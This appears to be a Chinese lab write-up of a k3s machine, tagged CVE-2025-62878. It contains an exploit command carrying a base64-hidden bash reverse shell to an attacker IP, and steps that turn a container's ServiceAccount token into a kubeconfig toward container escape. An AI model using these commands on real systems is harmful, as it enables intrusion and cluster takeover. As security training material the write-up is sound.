---
title: 'love_lovers'
date: 2026-03-19 16:38:55 +0800
categories:
  - 渗透练习
  - mazesec
tags:
  - CVE-2025-62878
---
## love_lovers

端口扫描

```
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 fd:7b:ff:e8:be:a0:67:8d:19:3d:03:b3:4a:16:63:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIvb4sYOSSH96f4hZZNMdiT9ch5YCV+RHh26OFu+FTo/kmFoZ078+ff3SoxREUpcttZej4Bz0SJKzzatkee1ljk=
|   256 22:10:16:06:31:b1:23:cc:5d:03:71:bc:99:5a:60:69 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELDZpaWJinJ7eL9y2sI0AWjv/D4y4FkUjPhaW+BppDc
80/tcp    open  http     syn-ack ttl 62 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
443/tcp   open  ssl/http syn-ack ttl 62 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=TRAEFIK DEFAULT CERT
| Subject Alternative Name: DNS:99765ff19a33a68fbeb757ab367bba2c.bffaaa89890d1fb25d64083bcb07b85d.traefik.default
| Issuer: commonName=TRAEFIK DEFAULT CERT
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-18T10:39:02
| Not valid after:  2027-03-18T10:39:02
| MD5:   2264:8256:bdb1:e07a:2653:661b:3e67:3f7f
| SHA-1: 9274:05ef:0755:b08f:2486:df31:60de:9792:13ab:b1b7
| -----BEGIN CERTIFICATE-----
| MIIDXTCCAkWgAwIBAgIQB8D64XTtx2zxohzL96cJOjANBgkqhkiG9w0BAQsFADAf
| MR0wGwYDVQQDExRUUkFFRklLIERFRkFVTFQgQ0VSVDAeFw0yNjAzMTgxMDM5MDJa
| Fw0yNzAzMTgxMDM5MDJaMB8xHTAbBgNVBAMTFFRSQUVGSUsgREVGQVVMVCBDRVJU
| MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAp15GaC4lorZ3rOlP8m7u
| c/si/G2eOfHHQQypJPyhNMxUcteE1LxQiHdjPWFvK3rPbw8EsxSTdFpaqBee+Kc2
| 4NSLcqV7cGFw2ku/cJoza2qe3ZPhjzuwukmQD06mMc1ItQBknP2//sHZP8Q2XHbb
| 3tx+Xn0b0zlREZZc1FvjzZQ6EvMA4YAQTtiiHCCl8TOamaLy1P2D2LfQ9xt4+sso
| HKrlqTDhUeTuwG6GBtEkygzF5fB1vVgXxe7KeeWqeMf8XzvXkgWpBGsR6+W2pgNK
| BlyGHVkUUB/iD7R7bD1yicuVqn2Z9m9ApbDkBCbgjJOZQThPHUw8ayXE7KXHnhs9
| SwIDAQABo4GUMIGRMA4GA1UdDwEB/wQEAwIDuDATBgNVHSUEDDAKBggrBgEFBQcD
| ATAMBgNVHRMBAf8EAjAAMFwGA1UdEQRVMFOCUTk5NzY1ZmYxOWEzM2E2OGZiZWI3
| NTdhYjM2N2JiYTJjLmJmZmFhYTg5ODkwZDFmYjI1ZDY0MDgzYmNiMDdiODVkLnRy
| YWVmaWsuZGVmYXVsdDANBgkqhkiG9w0BAQsFAAOCAQEAl2Recw6qx8zj/fBPZmlb
| 7hxEoW8NoYfAOmvLWePVkXcLsQqUCyJ8o35Oq5/kFKLvzvmw3LnYkIIAe9mb+PXT
| +5h/3eHky2xv9ULM9p7vPukzZWpO1L3JafTVUzDQShPA9fdyTtWJBP/BfeQulGnj
| o9Kj8dlOTRUXclPrk0krMZxM7DivJUP6e1Mlf6kmVSCVrn7gybZmk+lxS4y6eAZF
| 6fcFoRqKXRKOsmrqSO56oHZ6Z4sxFUI/WcfMAxf/5OeE4mictywY/WjcwVjaoh3M
| v4K7lb6gmqt2VXOoAA6WtQdvwRCVjlK080tJdcj1iBMLT+n4LmqUZUyTSy7CYVj/
| gQ==
|_-----END CERTIFICATE-----
6443/tcp  open  ssl/http syn-ack ttl 64 Golang net/http server
|_http-title: Site doesn't have a title (application/json).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 270e7b1b-7b1b-4602-adb7-63f7fc76e81f
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Wed, 18 Mar 2026 10:40:12 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, LPDString, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: b4048cdd-5fc9-4a33-9da9-82a73d91a64e
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Wed, 18 Mar 2026 10:39:57 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: d1d2f5d1-d7dd-4c81-812e-927f375900f4
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Wed, 18 Mar 2026 10:39:57 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=k3s/organizationName=k3s
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, DNS:osboxes, IP Address:10.43.0.1, IP Address:127.0.0.1, IP Address:172.20.10.3, IP Address:192.168.2.233, IP Address:192.168.31.89, IP Address:192.168.56.254, IP Address:2409:8900:1586:F4:500:A998:E248:940A, IP Address:2409:8A20:2D2C:E681:0:0:0:D3C, IP Address:0:0:0:0:0:0:0:1
| Issuer: commonName=k3s-server-ca@1771762699
| Public Key type: ec
| Public Key bits: 256
| Signature Algorithm: ecdsa-with-SHA256
| Not valid before: 2026-02-22T12:18:19
| Not valid after:  2027-03-18T10:38:41
| MD5:   7d6d:6257:96da:9d0c:01a0:c8a4:5d57:5fd1
| SHA-1: dad8:5a87:92ad:3967:ea63:b270:e156:ec8c:39c9:35af
| -----BEGIN CERTIFICATE-----
| MIICWzCCAgGgAwIBAgIIG8ooTHcTHrwwCgYIKoZIzj0EAwIwIzEhMB8GA1UEAwwY
| azNzLXNlcnZlci1jYUAxNzcxNzYyNjk5MB4XDTI2MDIyMjEyMTgxOVoXDTI3MDMx
| ODEwMzg0MVowHDEMMAoGA1UEChMDazNzMQwwCgYDVQQDEwNrM3MwWTATBgcqhkjO
| PQIBBggqhkjOPQMBBwNCAAR59wonFNZnwbEwqAurt9eT6RbG1auA18ClSKkkQD/F
| sjJn1AomPf0mru59vihafanA+Ph1MmYDohcN1In4V7xRo4IBJDCCASAwDgYDVR0P
| AQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMBMB8GA1UdIwQYMBaAFCn+xpCu
| ZVVB7Nz4xkwuZqPPaz7rMIHXBgNVHREEgc8wgcyCCmt1YmVybmV0ZXOCEmt1YmVy
| bmV0ZXMuZGVmYXVsdIIWa3ViZXJuZXRlcy5kZWZhdWx0LnN2Y4Ika3ViZXJuZXRl
| cy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2Fsgglsb2NhbGhvc3SCB29zYm94ZXOH
| BAorAAGHBH8AAAGHBKwUCgOHBMCoAumHBMCoH1mHBMCoOP6HECQJiQAVhgD0BQCp
| mOJIlAqHECQJiiAtLOaBAAAAAAAADTyHEAAAAAAAAAAAAAAAAAAAAAEwCgYIKoZI
| zj0EAwIDSAAwRQIgX70corkiIj/z2T/cDbBN6al4aGXZ21CqM9UOAqsDYmgCIQCv
| SwX3OLdWe1XFN+fp+6ufIA120bAqIS3+v+R/FG9gVw==
|_-----END CERTIFICATE-----
10250/tcp open  ssl/http syn-ack ttl 64 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| ssl-cert: Subject: commonName=osboxes
| Subject Alternative Name: DNS:osboxes, DNS:localhost, IP Address:127.0.0.1, IP Address:172.20.10.3, IP Address:2409:8900:1586:F4:500:A998:E248:940A
| Issuer: commonName=k3s-server-ca@1771762699
| Public Key type: ec
| Public Key bits: 256
| Signature Algorithm: ecdsa-with-SHA256
| Not valid before: 2026-02-22T12:18:19
| Not valid after:  2027-03-18T10:38:46
| MD5:   48e8:f146:a6e0:9dae:f0b1:710a:9feb:db95
| SHA-1: 245d:b215:ef5f:a1c5:63e1:2236:c02c:410a:f3ce:4f4a
| -----BEGIN CERTIFICATE-----
| MIIBsTCCAVigAwIBAgIIXW3k5MBs2iEwCgYIKoZIzj0EAwIwIzEhMB8GA1UEAwwY
| azNzLXNlcnZlci1jYUAxNzcxNzYyNjk5MB4XDTI2MDIyMjEyMTgxOVoXDTI3MDMx
| ODEwMzg0NlowEjEQMA4GA1UEAxMHb3Nib3hlczBZMBMGByqGSM49AgEGCCqGSM49
| AwEHA0IABBuThsh/SQ+pQRQKA7Oq8UNVxMyLdT+jtA8zEnqA+cfwhERLwo7mGsg4
| yozsElf6CAsFUHJ4fJ3/7hXkf4jLIwajgYYwgYMwDgYDVR0PAQH/BAQDAgWgMBMG
| A1UdJQQMMAoGCCsGAQUFBwMBMB8GA1UdIwQYMBaAFCn+xpCuZVVB7Nz4xkwuZqPP
| az7rMDsGA1UdEQQ0MDKCB29zYm94ZXOCCWxvY2FsaG9zdIcEfwAAAYcErBQKA4cQ
| JAmJABWGAPQFAKmY4kiUCjAKBggqhkjOPQQDAgNHADBEAiEApAPxfQcgFkPMU476
| xQb/LyKLqBz5VVMpG5LNqgzVUEECH0/GG54xt//nhq3AGjAKxw6sE08vXI7uzSgg
| RimEpl4=
|_-----END CERTIFICATE-----
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
30081/tcp open  unknown  syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|     Date: Wed, 18 Mar 2026 10:39:56 GMT
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 Found
|     Content-Length: 0
|     Connection: close
|     Date: Wed, 18 Mar 2026 10:39:56 GMT
|     Location: /interface/root
|     Content-Security-Policy: default-src 'self';frame-src 'self' *.youtube.com youtu.be *.smartertools.com docs.google.com;script-src * 'unsafe-inline';font-src * 'unsafe-inline' data:;img-src * 'unsafe-inline' data: blob:;style-src * 'unsafe-inline';media-src *;frame-ancestors 'self';connect-src *;
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     X-Content-Type-Options: nosniff
|     X-Robots-Tag: noindex
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Content-Length: 0
|     Connection: close
|_    Date: Wed, 18 Mar 2026 10:39:56 GMT
30819/tcp open  http     syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
31319/tcp open  http     syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).

```



```
python3 exploit.py --url http://$IP:30081/ --newpass 1qaz@WSX --cmd "printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC4zMi4xNDIvNDQ0NCAwPiYxKSAm|base64 -d|bash"
```



确实找了很久，自动化收集工具都分析不出来什么东西，我就去网上搜“k3s容器逃逸”，[找到了这么一篇文章](https://zone.ci/secarticles/wx/497713.html)，CVE-2025-62878

容器里头没有kubectl，传一个进来

```bash
cd /tmp
curl -LO https://dl.k8s.io/release/v1.25.0/bin/linux/amd64/kubectl
chmod +x kubectl
mv kubectl /usr/local/bin/
```

使用容器内的 token 获得权限

```bash
# 导出 ServiceAccount 凭证
export KUBECONFIG=/tmp/kubeconfig
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 创建 kubeconfig
cat << EOF > /tmp/kubeconfig
apiVersion: v1
kind: Config
clusters:
- cluster:
    certificate-authority: ${CA_CERT}
    server: https://kubernetes.default.svc
  name: local
contexts:
- context:
    cluster: local
    namespace: shinnai-kankyou
    user: ura-omote-sa
  name: local
current-context: local
users:
- name: ura-omote-sa
  user:
    token: ${TOKEN}
EOF

# 验证权限
kubectl auth can-i create pvc
kubectl auth can-i create storageclass
```




